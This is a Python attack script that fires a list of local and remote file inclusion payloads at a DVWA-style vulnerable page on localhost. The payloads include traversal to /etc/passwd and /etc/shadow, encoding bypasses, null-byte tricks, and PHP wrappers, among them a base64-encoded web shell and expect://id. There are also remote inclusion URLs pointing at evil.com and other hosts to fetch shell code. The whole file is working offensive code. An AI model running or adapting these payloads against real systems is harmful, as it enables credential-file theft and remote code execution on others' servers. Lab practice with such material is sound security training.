import requests, time, random
TARGET = 'http://localhost:8080/vulnerabilities/fi/'
COOKIES = {'PHPSESSID': '983dc63d0bda26c28f2b4bd1e70771dd', 'security': 'low'}
PAYLOADS = [
    # --- Classic Directory Traversal ---
    '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd',
    '/etc/passwd', '/etc/issue', '/etc/shadow', '/etc/group', '/etc/hosts',
    '..\\..\\..\\windows\\win.ini', '..\\..\\..\\..\\boot.ini', 'C:/Windows/System32/drivers/etc/hosts',
    
    # --- Evasion via Filter Bypasses ---
    '....//....//....//etc/shadow', '..././..././..././etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd', # Double URL Encode

    # --- Null Byte Injections ---
    '../../../../etc/passwd%00', 'index.php%00', 'config.inc.php%00',
    
    # --- PHP Wrappers (LFI to RCE or Data Exfil) ---
    'php://filter/convert.base64-encode/resource=index.php', 
    'php://filter/read=string.rot13/resource=config.php',
    'php://filter/zlib.deflate/convert.base64-encode/resource=config.php', # Deflate Bypass
    'zip://uploads/archive.zip#shell.php',
    'phar://uploads/archive.phar/shell.php',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=', # Direct Code execution
    'expect://id', # Direct RCE if expect is enabled
    
    # --- Remote File Inclusion (RFI) ---
    'http://evil.com/shell.txt', 'https://raw.githubusercontent.com/payloads/shell.php',
    'ftp://10.0.0.1/pub/shell.php', 'dict://127.0.0.1:11211'
]
print('--- A04: Insecure Design (LFI / RFI) ---')
for p in PAYLOADS:
    res = requests.get(TARGET, params={'page': p}, cookies=COOKIES)
    print(f'[*] LFI/RFI payload: {p} -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
